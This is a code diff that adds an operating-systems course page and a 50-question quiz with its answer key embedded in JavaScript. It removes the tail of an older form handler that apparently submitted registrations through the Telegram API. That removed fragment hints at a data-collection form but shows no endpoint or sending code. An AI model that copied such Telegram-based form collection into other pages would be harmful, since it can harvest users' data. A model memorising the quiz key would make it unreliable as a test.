+                    <h3 class="text-xl font-semibold mt-4 mb-2 text-slate-800">3.2 Semaphores and Mutexes</h3>
+                    <p class="mb-2 text-slate-700">Hardware solutions are complex. OS provides software tools:</p>
+                    <ul class="list-disc list-inside text-slate-700 space-y-2 mb-6 ml-4">
+                        <li><strong>Mutex Locks (Mutual Exclusion):</strong> A simple lock. A process must acquire the lock before entering the critical section and release it when exiting. Usually implemented with hardware instructions like 'test_and_set'.</li>
+                        <li><strong>Semaphores:</strong> An integer variable accessed via two atomic operations: <code>wait()</code> (decrements) and <code>signal()</code> (increments). 
+                            <ul class="list-circle list-inside ml-8 mt-1 text-sm text-slate-600">
+                                <li>Binary Semaphore: Acts like a mutex (values 0 or 1).</li>
+                                <li>Counting Semaphore: Controls access to a resource with multiple instances.</li>
+                            </ul>
+                        </li>
+                    </ul>
+
+                    <h3 class="text-xl font-semibold mt-8 mb-2 text-slate-800 text-red-600 border-b border-red-200 pb-2">3.3 Deadlocks</h3>
+                    <p class="mb-4 text-slate-700">A deadlock is a situation where a set of processes are blocked because each process is holding a resource and waiting for another resource acquired by some other process.</p>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                        <div class="bg-red-50 p-4 rounded-lg border border-red-100">
+                            <h4 class="font-bold text-red-800 mb-2">4 Necessary Conditions for Deadlock:</h4>
+                            <ul class="list-disc list-inside text-red-900 space-y-1 text-sm">
+                                <li><strong>Mutual Exclusion:</strong> At least one resource must be non-sharable.</li>
+                                <li><strong>Hold and Wait:</strong> A process holding a resource is waiting to acquire additional resources held by others.</li>
+                                <li><strong>No Preemption:</strong> Resources cannot be forcibly taken away from a process.</li>
+                                <li><strong>Circular Wait:</strong> A closed chain of processes exists, each waiting for a resource held by the next.</li>
+                            </ul>
+                        </div>
+                        <div class="bg-green-50 p-4 rounded-lg border border-green-100">
+                            <h4 class="font-bold text-green-800 mb-2">Handling Deadlocks:</h4>
+                            <ul class="list-disc list-inside text-green-900 space-y-1 text-sm">
+                                <li><strong>Prevention:</strong> Ensure at least one of the 4 conditions cannot hold.</li>
+                                <li><strong>Avoidance:</strong> OS requires advance knowledge of resource requests (e.g., Banker's Algorithm) to ensure the system never enters an "unsafe" state.</li>
+                                <li><strong>Detection & Recovery:</strong> Allow deadlocks to happen, detect them periodically, and recover (e.g., by aborting processes).</li>
+                                <li><strong>Ignorance:</strong> (The Ostrich Algorithm) Pretend they never happen. Common in modern desktop OSes like Windows/Linux because deadlocks are rare and prevention is too costly.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Module 4: Memory Management -->
+                <div>
+                    <h2 class="text-3xl font-bold text-blue-700 mb-6 flex items-center"><i class="fa-solid fa-memory mr-3"></i> 4. Memory Management & Virtual Memory</h2>
+                    <p class="mb-4 leading-relaxed text-lg text-slate-700">Memory management manages primary memory (RAM) and moves processes back and forth between main memory and disk during execution. It keeps track of every memory location.</p>
+                    
+                    <h3 class="text-xl font-semibold mt-4 mb-2 text-slate-800">4.1 Contiguous vs. Non-Contiguous Allocation</h3>
+                    <ul class="list-disc list-inside text-slate-700 space-y-2 mb-4 ml-4">
+                        <li><strong>Contiguous:</strong> The entire process is loaded into a single block of memory. Suffers from <em>External Fragmentation</em> (plenty of free memory total, but not in a single contiguous block).</li>
+                        <li><strong>Non-Contiguous (Paging & Segmentation):</strong> A process can be scattered across physical memory. Solves external fragmentation.</li>
+                    </ul>
+
+                    <div class="bg-amber-50 border-l-4 border-amber-500 p-6 mb-6 rounded-r-md shadow-sm">
+                        <h4 class="font-bold text-amber-800 text-lg mb-2">Paging Explained</h4>
+                        <p class="text-amber-900 text-sm mb-2">Physical memory is divided into fixed-size blocks called <strong>Frames</strong>. Logical (virtual) memory is divided into blocks of the same size called <strong>Pages</strong>.</p>
+                        <p class="text-amber-900 text-sm">When a process runs, its pages are loaded into any available memory frames. The OS maintains a <strong>Page Table</strong> for every process to map logical page numbers to physical frame numbers.</p>
+                        <ul class="list-disc list-inside text-amber-900 mt-2 text-sm ml-4">
+                            <li>Solves external fragmentation.</li>
+                            <li>Introduces <em>Internal Fragmentation</em> (the last page of a process might not be fully used).</li>
+                        </ul>
+                    </div>
+
+                    <h3 class="text-xl font-semibold mt-6 mb-2 text-slate-800">4.2 Virtual Memory</h3>
+                    <p class="mb-4 text-slate-700">Virtual memory is a technique that allows the execution of processes that are not completely in memory. It provides the illusion of a very large memory, often much larger than actual physical RAM.</p>
+                    
+                    <ul class="list-disc list-inside text-slate-700 space-y-3 mb-6 ml-4">
+                        <li><strong>Demand Paging:</strong> Pages are brought into memory only when they are needed (demanded) by the CPU.</li>
+                        <li><strong>Page Fault:</strong> If the CPU tries to access a page that is NOT currently in RAM (it's on the disk), a page fault trap occurs. The OS must suspend the process, read the page from disk into a free frame, update the page table, and restart the instruction.</li>
+                        <li><strong>Page Replacement Algorithms:</strong> If memory is full, the OS must swap out an existing page to make room for a new one. Goal: Minimize page faults.
+                            <ul class="list-circle list-inside ml-8 mt-1 text-sm text-slate-600">
+                                <li><strong>FIFO (First-In, First-Out):</strong> Replaces the oldest page. Can suffer from Belady's Anomaly (more frames = more faults).</li>
+                                <li><strong>LRU (Least Recently Used):</strong> Replaces the page that has not been used for the longest time. Generally very good performance.</li>
+                                <li><strong>Optimal:</strong> Replaces the page that will not be used for the longest period of time in the future. (Theoretical limit, used as a benchmark).</li>
+                            </ul>
+                        </li>
+                    </ul>
+                    
+                    <div class="bg-gray-800 text-white p-4 rounded-md font-mono text-sm">
+                        // Thrashing
+                        If a system does not have enough memory, it might spend more time swapping pages in and out of the disk than actually executing processes. CPU utilization drops drastically. This severe performance collapse is called Thrashing.
+                    </div>
+                </div>
+
+                <!-- Module 5: File Systems -->
+                <div>
+                    <h2 class="text-3xl font-bold text-blue-700 mb-6 flex items-center"><i class="fa-solid fa-folder-tree mr-3"></i> 5. File System Implementation</h2>
+                    <p class="mb-4 leading-relaxed text-lg text-slate-700">The file system provides a logical view of information storage and is implemented on secondary storage (disks). It organizes data into files and directories for easy retrieval.</p>
+                    
+                    <h3 class="text-xl font-semibold mt-4 mb-2 text-slate-800">5.1 Directory Structure</h3>
+                    <p class="mb-2 text-slate-700">Directories organize files. Common structures include:</p>
+                    <ul class="list-disc list-inside text-slate-700 space-y-2 mb-6 ml-4">
+                        <li><strong>Single-Level:</strong> All files in one directory (naming collisions).</li>
+                        <li><strong>Two-Level:</strong> Separate directory for each user.</li>
+                        <li><strong>Tree-Structured:</strong> Hierarchical structure (like Windows C:\ or Unix /). Most common today. Allows arbitrary depth.</li>
+                        <li><strong>Acyclic-Graph:</strong> Allows directories to share subdirectories and files (links/shortcuts).</li>
+                    </ul>
+
+                    <h3 class="text-xl font-semibold mt-4 mb-2 text-slate-800">5.2 Allocation Methods</h3>
+                    <p class="mb-2 text-slate-700">How do we allocate disk space to a file so it can be accessed efficiently?</p>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                        <div class="bg-white p-4 border rounded shadow-sm">
+                            <h4 class="font-bold text-slate-800 border-b pb-2 mb-2">Contiguous</h4>
+                            <p class="text-sm text-slate-600">File occupies contiguous blocks on disk. Great for sequential access. Bad for file growth; causes external fragmentation.</p>
+                        </div>
+                        <div class="bg-white p-4 border rounded shadow-sm">
+                            <h4 class="font-bold text-slate-800 border-b pb-2 mb-2">Linked</h4>
+                            <p class="text-sm text-slate-600">File is a linked list of blocks. Scattered anywhere. Solves fragmentation, file growth is easy. Bad for random access (must traverse list).</p>
+                        </div>
+                        <div class="bg-white p-4 border rounded shadow-sm">
+                            <h4 class="font-bold text-slate-800 border-b pb-2 mb-2">Indexed</h4>
+                            <p class="text-sm text-slate-600">Brings all pointers together into an 'index block'. Supports direct access. Slight overhead for the index block itself.</p>
+                        </div>
+                    </div>
+
+                    <h3 class="text-xl font-semibold mt-4 mb-2 text-slate-800">5.3 Free-Space Management</h3>
+                    <p class="mb-4 text-slate-700">The OS must track which disk blocks are free. Common methods:</p>
+                    <ul class="list-disc list-inside text-slate-700 space-y-1 mb-6 ml-4">
+                        <li><strong>Bit Vector (Bitmap):</strong> 1 bit per disk block (1 = free, 0 = allocated). Fast to find contiguous free blocks, but bitmap can be large.</li>
+                        <li><strong>Linked List:</strong> Link together all free blocks. No extra space needed, but traversing is slow.</li>
+                    </ul>
+
+                    <div class="bg-indigo-50 border-l-4 border-indigo-500 p-4 mb-4 rounded-r-md">
+                        <h4 class="font-semibold text-indigo-800">Unix Inodes:</h4>
+                        <p class="text-indigo-900 text-sm">In Unix-like systems, an <em>inode</em> (index node) is a data structure representing a file or directory. It stores metadata (permissions, ownership, size, timestamps) and pointers to the actual data blocks on the disk using a combined indexed scheme (direct pointers, single-indirect, double-indirect, triple-indirect) to handle both small and huge files efficiently.</p>
+                    </div>
+                </div>
+
+                <div class="mt-16 text-center pb-8 border-t pt-10">
+                    <div class="inline-block p-4 rounded-full bg-blue-100 text-blue-600 mb-4">
+                        <i class="fa-solid fa-graduation-cap text-5xl"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold text-slate-800 mb-4">Course Completed!</h3>
+                    <p class="text-lg text-slate-600 mb-8 max-w-2xl mx-auto">You have thoroughly reviewed the fundamentals of Operating Systems, from process scheduling to virtual memory and file systems. It is time to put your knowledge to the test.</p>
+                    <button onclick="switchTab('quiz')" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-full shadow-lg transition transform hover:scale-105 text-lg">
+                        Take the 50-Question Master Quiz <i class="fa-solid fa-arrow-right ml-2"></i>
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== QUIZ SECTION ==================== -->
+        <section id="quiz-section" class="hidden-content fade-in">
+            
+            <div id="quiz-setup" class="bg-white p-10 rounded-xl shadow-lg border border-slate-200 text-center max-w-3xl mx-auto mt-8">
+                <i class="fa-solid fa-clipboard-list text-6xl text-blue-500 mb-6"></i>
+                <h2 class="text-3xl font-bold text-slate-900 mb-4">Operating Systems Master Assessment</h2>
+                <p class="text-slate-600 mb-8 text-lg">This comprehensive assessment contains 50 multiple-choice questions. It will test your understanding of OS architecture, process management, deadlocks, memory virtualization, and file systems.</p>
+                
+                <div class="grid grid-cols-2 gap-4 mb-8 text-left bg-slate-50 p-6 rounded-lg">
+                    <div><i class="fa-solid fa-list-ol text-blue-500 mr-2"></i> <strong>50 Questions</strong></div>
+                    <div><i class="fa-solid fa-clock text-blue-500 mr-2"></i> <strong>Take your time</strong></div>
+                    <div><i class="fa-solid fa-check-double text-blue-500 mr-2"></i> <strong>Immediate feedback</strong></div>
+                    <div><i class="fa-solid fa-chart-pie text-blue-500 mr-2"></i> <strong>Detailed results</strong></div>
+                </div>
+
+                <button onclick="startQuiz()" class="bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-12 rounded-full shadow-lg transition transform hover:scale-105 text-xl">
+                    Begin Assessment
+                </button>
+            </div>
+
+            <div id="quiz-container" class="hidden-content bg-white p-6 md:p-10 rounded-xl shadow-lg border border-slate-200 relative">
+                
+                <!-- Progress Header -->
+                <div class="flex flex-col md:flex-row md:justify-between items-center mb-6 pb-4 border-b border-slate-200 gap-4">
+                    <span class="text-sm font-semibold text-slate-500 uppercase tracking-wide">Question <span id="current-question-num" class="text-blue-600 text-xl font-bold">1</span> of 50</span>
+                    <span class="text-sm font-semibold text-slate-500 uppercase tracking-wide bg-green-50 px-4 py-2 rounded-full border border-green-200">Score: <span id="current-score" class="text-green-700 text-xl font-bold">0</span></span>
+                </div>
+
+                <!-- Progress Bar -->
+                <div class="w-full bg-slate-100 rounded-full h-3 mb-8 overflow-hidden shadow-inner">
+                    <div id="progress-bar" class="bg-gradient-to-r from-blue-500 to-blue-600 h-3 rounded-full transition-all duration-500 ease-out" style="width: 2%"></div>
+                </div>
+
+                <!-- Question -->
+                <div class="min-h-[6rem] flex items-center mb-8">
+                    <h3 id="question-text" class="text-xl md:text-2xl font-bold text-slate-800 leading-snug"></h3>
+                </div>
+
+                <!-- Options -->
+                <div id="options-container" class="space-y-3 mb-8">
+                    <!-- Options injected here by JS -->
+                </div>
+
+                <!-- Footer / Controls -->
+                <div class="flex flex-col sm:flex-row justify-between items-center mt-8 pt-6 border-t border-slate-100 min-h-[4rem]">
+                    <div id="feedback-text" class="text-lg font-semibold mb-4 sm:mb-0"></div>
+                    <button id="next-btn" onclick="nextQuestion()" class="hidden-content bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-8 rounded-lg shadow-md transition w-full sm:w-auto">
+                        Next Question <i class="fa-solid fa-chevron-right ml-2"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Results Screen -->
+            <div id="results-container" class="hidden-content bg-white p-8 md:p-12 rounded-xl shadow-lg border border-slate-200 text-center max-w-4xl mx-auto">
+                <div id="result-icon-container" class="inline-block p-6 rounded-full mb-6">
+                    <i id="result-icon" class="fa-solid fa-trophy text-6xl"></i>
+                </div>
+                <h2 class="text-4xl font-extrabold text-slate-900 mb-2">Assessment Complete!</h2>
+                <p class="text-xl text-slate-600 mb-10">Here is your performance summary for the Operating Systems course.</p>
+                
+                <div class="flex flex-wrap justify-center gap-6 mb-10">
+                    <div class="bg-white p-6 rounded-xl shadow-md border border-slate-100 w-48 relative overflow-hidden">
+                        <div class="absolute top-0 left-0 w-full h-1 bg-blue-500"></div>
+                        <div class="text-5xl font-black text-slate-800 mb-2" id="final-score">0<span class="text-2xl text-slate-400 font-medium">/50</span></div>
+                        <div class="text-sm font-bold text-slate-500 uppercase tracking-wider">Correct Answers</div>
+                    </div>
+                    <div class="bg-white p-6 rounded-xl shadow-md border border-slate-100 w-48 relative overflow-hidden">
+                        <div class="absolute top-0 left-0 w-full h-1 bg-green-500"></div>
+                        <div class="text-5xl font-black text-slate-800 mb-2" id="final-percentage">0%</div>
+                        <div class="text-sm font-bold text-slate-500 uppercase tracking-wider">Accuracy</div>
+                    </div>
+                </div>
+
+                <div id="performance-message" class="text-xl font-medium mb-10 p-6 rounded-xl shadow-sm border border-slate-100 max-w-2xl mx-auto"></div>
+
+                <div class="flex flex-col sm:flex-row justify-center gap-4">
+                    <button onclick="retakeQuiz()" class="bg-slate-800 hover:bg-slate-900 text-white font-bold py-3 px-8 rounded-lg shadow transition flex items-center justify-center">
+                        <i class="fa-solid fa-rotate-right mr-3"></i> Retake Assessment
+                    </button>
+                    <button onclick="switchTab('course')" class="bg-blue-100 hover:bg-blue-200 text-blue-800 font-bold py-3 px-8 rounded-lg shadow transition flex items-center justify-center">
+                        <i class="fa-solid fa-book-open mr-3"></i> Review Course Material
+                    </button>
+                </div>
+            </div>
+
+        </section>
+    </main>
+
+    <footer class="bg-slate-900 text-slate-400 py-8 mt-auto border-t-4 border-blue-600">
+        <div class="max-w-7xl mx-auto px-4 text-center text-sm">
+            <p class="mb-2"><i class="fa-solid fa-code-branch mr-2"></i> OS Fundamentals Masterclass</p>
+            <p>&copy; 2026. Designed for advanced computer science education.</p>
+        </div>
+    </footer>
+
+    <script>
+        // --- QUIZ DATA: 50 Questions covering the expanded course ---
+        const quizData = [
+            // Introduction & Overview
+            { q: "Which of the following is the primary objective of an Operating System?", opts: ["Provide Internet connectivity", "Manage computer resources efficiently", "Compile source code into machine code", "Protect the system from viruses"], ans: 1 },
+            { q: "What is the core component of an Operating System that remains in memory constantly?", opts: ["Shell", "File Manager", "Kernel", "Compiler"], ans: 2 },
+            { q: "Which generation of operating systems introduced 'Multiprogramming'?", opts: ["First Generation", "Second Generation", "Third Generation", "Fourth Generation"], ans: 2 },
+            { q: "During the boot process, what loads the OS Kernel into main memory?", opts: ["BIOS/UEFI", "Bootloader", "Master Boot Record (MBR)", "The CPU"], ans: 1 },
+            { q: "Which of the following acts as a command interpreter or user interface to the OS?", opts: ["Kernel", "Device Driver", "Shell", "Microkernel"], ans: 2 },
+            { q: "In a dual-mode operating system, typical user programs run in:", opts: ["Kernel Mode", "Supervisor Mode", "System Mode", "User Mode"], ans: 3 },
+            { q: "A system call is:", opts: ["A hardware interrupt", "A request by an active process for a service from the kernel", "A network ping request", "A boot sequence command"], ans: 1 },
+            
+            // Process Management
+            { q: "A program in execution is called a:", opts: ["Thread", "Process", "Task", "Instruction"], ans: 1 },
+            { q: "Where does the OS store all information relevant to a specific process?", opts: ["Process Control Block (PCB)", "File Allocation Table (FAT)", "Page Table", "System Stack"], ans: 0 },
+            { q: "When a process is waiting for I/O to complete, it is in which state?", opts: ["Ready", "Running", "Waiting / Blocked", "Terminated"], ans: 2 },
+            { q: "The transition from the 'Running' state to the 'Ready' state is typically caused by:", opts: ["I/O request", "An interrupt (like a timer going off)", "Process completion", "Waiting for user input"], ans: 1 },
+            { q: "Which scheduler selects which processes should be brought into the ready queue from disk?", opts: ["Short-term scheduler (CPU scheduler)", "Medium-term scheduler", "Long-term scheduler (Job scheduler)", "Dispatcher"], ans: 2 },
+            { q: "Saving the state of one process and loading the state of another is called a:", opts: ["Context Switch", "System Call", "Interrupt Handling", "Process Migration"], ans: 0 },
+            { q: "Which of the following CPU scheduling algorithms can suffer from the 'Convoy Effect'?", opts: ["Round Robin", "First-Come, First-Served (FCFS)", "Shortest Job First (SJF)", "Multilevel Queue"], ans: 1 },
+            { q: "Which CPU scheduling algorithm gives the theoretical minimum average waiting time?", opts: ["FCFS", "Priority Scheduling", "Shortest Job First (SJF)", "Round Robin"], ans: 2 },
+            { q: "In Round Robin scheduling, the time allocated to each process before it is preempted is called:", opts: ["Turnaround Time", "Burst Time", "Waiting Time", "Time Quantum"], ans: 3 },
+            { q: "Starvation (infinite blocking) is a common problem in which scheduling algorithm?", opts: ["Round Robin", "Priority Scheduling", "FCFS", "All of the above"], ans: 1 },
+            { q: "A process that has terminated, but whose parent has not yet called wait(), is known as a:", opts: ["Orphan Process", "Zombie Process", "Daemon Process", "Child Process"], ans: 1 },
+
+            // Concurrency & Synchronization
+            { q: "A segment of code where shared memory/resources are accessed is called a:", opts: ["Monitor", "Semaphore", "Critical Section", "Mutex block"], ans: 2 },
+            { q: "Which condition for solving the Critical Section problem ensures that if no process is executing in its critical section, then the selection of the next process cannot be postponed indefinitely?", opts: ["Mutual Exclusion", "Progress", "Bounded Waiting", "Preemption"], ans: 1 },
+            { q: "An integer variable accessed via atomic wait() and signal() operations is a:", opts: ["Monitor", "Condition Variable", "Mutex Lock", "Semaphore"], ans: 3 },
+            { q: "A binary semaphore is effectively equivalent to a:", opts: ["Mutex Lock", "Counting Semaphore", "Monitor", "Deadlock"], ans: 0 },
+            { q: "Deadlock is a situation where:", opts: ["The OS crashes", "Processes wait indefinitely for an event that can only be triggered by one of the waiting processes", "CPU utilization drops to 0%", "A process gets stuck in an infinite loop"], ans: 1 },
+            { q: "Which of the following is NOT one of the four necessary conditions for Deadlock?", opts: ["Mutual Exclusion", "Hold and Wait", "No Preemption", "Context Switching"], ans: 3 },
+            { q: "The condition where a closed chain of processes exists, each waiting for a resource held by the next, is:", opts: ["Hold and Wait", "Circular Wait", "Starvation", "Mutual Exclusion"], ans: 1 },
+            { q: "Banker's Algorithm is used for:", opts: ["Deadlock Prevention", "Deadlock Detection", "Deadlock Avoidance", "Deadlock Recovery"], ans: 2 },
+            { q: "Deadlock Prevention works by:", opts: ["Ensuring at least one of the necessary conditions cannot hold", "Dynamically examining resource-allocation state", "Aborting processes after a deadlock occurs", "Ignoring the problem completely"], ans: 0 },
+            
+            // Memory Management
+            { q: "The problem of having plenty of total free memory, but not enough in a single contiguous block to satisfy a request, is known as:", opts: ["Internal Fragmentation", "External Fragmentation", "Thrashing", "Paging"], ans: 1 },
+            { q: "In paging, logical (virtual) memory is divided into fixed-size blocks called:", opts: ["Frames", "Pages", "Segments", "Clusters"], ans: 1 },
+            { q: "In paging, physical memory (RAM) is divided into fixed-size blocks called:", opts: ["Frames", "Pages", "Segments", "Sectors"], ans: 0 },
+            { q: "What data structure does the OS use to map logical page numbers to physical frame numbers?", opts: ["File Allocation Table (FAT)", "Process Control Block (PCB)", "Page Table", "Translation Lookaside Buffer (TLB)"], ans: 2 },
+            { q: "A special, fast hardware cache used to store recent page table translations is called the:", opts: ["L1 Cache", "Translation Lookaside Buffer (TLB)", "Instruction Register", "Program Counter"], ans: 1 },
+            { q: "Paging solves external fragmentation, but can still suffer from:", opts: ["Thrashing", "Deadlock", "Internal Fragmentation", "Starvation"], ans: 2 },
+            { q: "Virtual memory is typically implemented using:", opts: ["Contiguous allocation", "Demand Paging", "Demand Segmentation", "Swapping entire processes"], ans: 1 },
+            { q: "A Page Fault occurs when:", opts: ["The CPU encounters a divide-by-zero error", "A process tries to access a memory address outside its address space", "A process tries to access a page that is currently not loaded in physical memory", "The page table gets corrupted"], ans: 2 },
+            { q: "Which page replacement algorithm replaces the page that has not been used for the longest time?", opts: ["FIFO", "Optimal", "Least Recently Used (LRU)", "Most Recently Used (MRU)"], ans: 2 },
+            { q: "Belady's Anomaly, where giving a process more frames actually increases page faults, can happen with which algorithm?", opts: ["LRU", "Optimal", "FIFO", "LFU"], ans: 2 },
+            { q: "When a system spends more time paging (swapping to disk) than executing processes, it is called:", opts: ["Starvation", "Thrashing", "Deadlocking", "Context Switching"], ans: 1 },
+
+            // File Systems
+            { q: "Which of the following is NOT a common file directory structure?", opts: ["Single-Level Directory", "Two-Level Directory", "Tree-Structured Directory", "Stack-Structured Directory"], ans: 3 },
+            { q: "Which directory structure allows sharing of subdirectories and files via links?", opts: ["Tree-Structured", "Acyclic-Graph Directory", "Single-Level", "Linear List"], ans: 1 },
+            { q: "Which disk allocation method suffers heavily from external fragmentation?", opts: ["Linked Allocation", "Indexed Allocation", "Contiguous Allocation", "Extent-based Allocation"], ans: 2 },
+            { q: "Which disk allocation method involves a linked list of blocks scattered anywhere on the disk?", opts: ["Contiguous Allocation", "Indexed Allocation", "Linked Allocation", "Direct Allocation"], ans: 2 },
+            { q: "Which disk allocation method uses an 'index block' to hold pointers to all data blocks of a file?", opts: ["Contiguous Allocation", "Linked Allocation", "Indexed Allocation", "FAT"], ans: 2 },
+            { q: "The File Allocation Table (FAT) used in MS-DOS is a variation of which allocation method?", opts: ["Contiguous Allocation", "Indexed Allocation", "Linked Allocation", "Bitmap Allocation"], ans: 2 },
+            { q: "In Unix-like systems, what data structure holds metadata about a file (permissions, pointers to blocks)?", opts: ["File Control Block (FCB)", "Inode", "Master File Table (MFT)", "Superblock"], ans: 1 },
+            { q: "Which free-space management technique represents each disk block with a single 0 or 1?", opts: ["Linked List", "Grouping", "Counting", "Bit Vector (Bitmap)"], ans: 3 },
+            { q: "In a magnetic disk, the time it takes to move the read/write head to the desired cylinder/track is called:", opts: ["Rotational Latency", "Seek Time", "Transfer Time", "Access Time"], ans: 1 },
+            { q: "Which disk scheduling algorithm services requests based on the shortest seek time from the current head position?", opts: ["FCFS", "SCAN (Elevator)", "C-SCAN", "Shortest Seek Time First (SSTF)"], ans: 3 },
+            { q: "What does RAID stand for?", opts: ["Random Access Independent Disks", "Redundant Array of Independent Disks", "Rapid Access Internal Data", "Redundant Allocation of Indexed Directories"], ans: 1 },
+            { q: "Which RAID level provides mirroring (complete redundancy) but no striping?", opts: ["RAID 0", "RAID 1", "RAID 5", "RAID 6"], ans: 1 }
+        ];
+
+        // State variables
+        let currentQuestionIndex = 0;
+        let score = 0;
+        let selectedOption = null;
+
+        // Navigation Function
+        function switchTab(tabId) {
+            const courseSec = document.getElementById('course-section');
+            const quizSec = document.getElementById('quiz-section');
+            const navCourse = document.getElementById('nav-course');
+            const navQuiz = document.getElementById('nav-quiz');
+
+            if (tabId === 'course') {
+                courseSec.style.display = 'block';
+                quizSec.style.display = 'none';
+                navCourse.classList.add('active');
+                navQuiz.classList.remove('active');
+            } else {
+                courseSec.style.display = 'none';
+                quizSec.style.display = 'block';
+                navCourse.classList.remove('active');
+                navQuiz.classList.add('active');
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Quiz Setup
+        function startQuiz() {
+            document.getElementById('quiz-setup').style.display = 'none';
+            document.getElementById('quiz-container').style.display = 'block';
+            document.getElementById('results-container').style.display = 'none';
+            
+            // Randomize questions for a fresh experience each time
+            quizData.sort(() => Math.random() - 0.5); 
+            
+            currentQuestionIndex = 0;
+            score = 0;
+            updateScoreDisplay();
+            loadQuestion();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function loadQuestion() {
+            const currentQ = quizData[currentQuestionIndex];
+            document.getElementById('question-text').innerText = `${currentQuestionIndex + 1}. ${currentQ.q}`;
+            
+            // Update progress
+            document.getElementById('current-question-num').innerText = currentQuestionIndex + 1;
+            const progress = ((currentQuestionIndex) / quizData.length) * 100;
+            document.getElementById('progress-bar').style.width = `${progress}%`;
+            
+            // Reset state
+            selectedOption = null;
+            document.getElementById('feedback-text').innerHTML = '';
+            document.getElementById('next-btn').style.display = 'none';
+            
+            // Render options
+            const optionsContainer = document.getElementById('options-container');
+            optionsContainer.innerHTML = '';
+            
+            currentQ.opts.forEach((opt, index) => {
+                const btn = document.createElement('div');
+                btn.className = 'quiz-option p-4 border-2 border-slate-200 rounded-xl text-lg font-medium text-slate-700 bg-white shadow-sm flex items-center group cursor-pointer';
+                btn.innerHTML = `
+                    <span class="w-10 h-10 flex-shrink-0 flex items-center justify-center bg-slate-100 border border-slate-300 rounded-lg mr-4 text-slate-500 font-bold group-hover:bg-blue-100 group-hover:text-blue-600 transition-colors">
+                        ${String.fromCharCode(65 + index)}
+                    </span> 
+                    <span>${opt}</span>
+                `;
+                btn.onclick = () => selectOption(index, btn);
+                optionsContainer.appendChild(btn);
+            });
+        }
+
+        function selectOption(index, element) {
+            // Prevent changing answer once selected
+            if (selectedOption !== null) return;
+            
+            selectedOption = index;
+            const currentQ = quizData[currentQuestionIndex];
+            const isCorrect = (index === currentQ.ans);
+            
+            // Disable all options
+            const allOptions = document.querySelectorAll('.quiz-option');
+            allOptions.forEach((opt, idx) => {
+                opt.classList.add('disabled');
+                const badge = opt.querySelector('span:first-child');
+                
+                // Highlight correct answer regardless of user choice
+                if (idx === currentQ.ans) {
+                    opt.classList.add('correct');
+                    opt.classList.replace('border-slate-200', 'border-green-500');
+                    badge.className = "w-10 h-10 flex-shrink-0 flex items-center justify-center bg-green-600 border border-green-700 rounded-lg mr-4 text-white font-bold";
+                    badge.innerHTML = '<i class="fa-solid fa-check"></i>';
                 }
+            });
+
+            const feedback = document.getElementById('feedback-text');
+            
+            if (isCorrect) {
+                score++;
+                updateScoreDisplay();
+                feedback.innerHTML = '<span class="text-green-600 flex items-center"><i class="fa-solid fa-circle-check text-2xl mr-2"></i> Correct!</span>';
+            } else {
+                element.classList.add('incorrect');
+                element.classList.replace('border-slate-200', 'border-red-500');
+                const wrongBadge = element.querySelector('span:first-child');
+                wrongBadge.className = "w-10 h-10 flex-shrink-0 flex items-center justify-center bg-red-600 border border-red-700 rounded-lg mr-4 text-white font-bold";
+                wrongBadge.innerHTML = '<i class="fa-solid fa-xmark"></i>';
+                
+                feedback.innerHTML = '<span class="text-red-500 flex items-center"><i class="fa-solid fa-circle-xmark text-2xl mr-2"></i> Incorrect</span>';
             }
 
-            // 6. Update UI to Success View
-            document.getElementById('formContainer').style.display = 'none';
-            document.getElementById('successView').style.display = 'block';
+            // Show next button
+            const nextBtn = document.getElementById('next-btn');
+            nextBtn.style.display = 'inline-block';
             
-            // Generate a random reference number
-            const ref = 'MIS-' + Math.floor(100000 + Math.random() * 900000);
-            document.getElementById('refNumber').innerText = ref;
-            
-            // Scroll to top
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-
-        } catch (error) {
-            console.error('Telegram API Error:', error);
-            alert('There was an error securely submitting your registration to the portal. Please try again.');
-        } finally {
-            // Re-enable button
-            submitBtn.innerText = originalBtnText;
-            submitBtn.disabled = false;
+            if (currentQuestionIndex === quizData.length - 1) {
+                nextBtn.innerHTML = 'View Final Results <i class="fa-solid fa-flag-checkered ml-2"></i>';
+                nextBtn.classList.replace('bg-blue-600', 'bg-indigo-600');
+                nextBtn.classList.replace('hover:bg-blue-700', 'hover:bg-indigo-700');
+            }
         }
-    });
-</script>
 
+        function nextQuestion() {
+            currentQuestionIndex++;
+            if (currentQuestionIndex < quizData.length) {
+                loadQuestion();
+            } else {
+                showResults();
+            }
+        }
+
+        function updateScoreDisplay() {
+            document.getElementById('current-score').innerText = score;
+        }
+
+        function showResults() {
+            document.getElementById('quiz-container').style.display = 'none';
+            const resultsContainer = document.getElementById('results-container');
+            resultsContainer.style.display = 'block';
+            
+            document.getElementById('final-score').innerHTML = `${score}<span class="text-2xl text-slate-400 font-medium">/50</span>`;
+            const percentage = Math.round((score / quizData.length) * 100);
+            document.getElementById('final-percentage').innerText = `${percentage}%`;
+            
+            const msgEl = document.getElementById('performance-message');
+            const iconEl = document.getElementById('result-icon');
+            const iconContainer = document.getElementById('result-icon-container');
+            
+            // Reset classes
+            msgEl.className = 'text-xl font-medium mb-10 p-6 rounded-xl shadow-sm border max-w-2xl mx-auto ';
+            iconContainer.className = 'inline-block p-6 rounded-full mb-6 ';
+            iconEl.className = 'text-6xl ';
+
+            if (percentage >= 90) {
+                msgEl.innerText = "Outstanding! You have demonstrated a master-level understanding of Operating Systems.";
+                msgEl.classList.add('bg-green-50', 'text-green-800', 'border-green-200');
+                iconContainer.classList.add('bg-yellow-100');
+                iconEl.classList.add('fa-solid', 'fa-trophy', 'text-yellow-500');
+            } else if (percentage >= 70) {
+                msgEl.innerText = "Great job! You have a solid grasp of core OS concepts, though there is room for minor refinement.";
+                msgEl.classList.add('bg-blue-50', 'text-blue-800', 'border-blue-200');
+                iconContainer.classList.add('bg-blue-100');
+                iconEl.classList.add('fa-solid', 'fa-medal', 'text-blue-500');
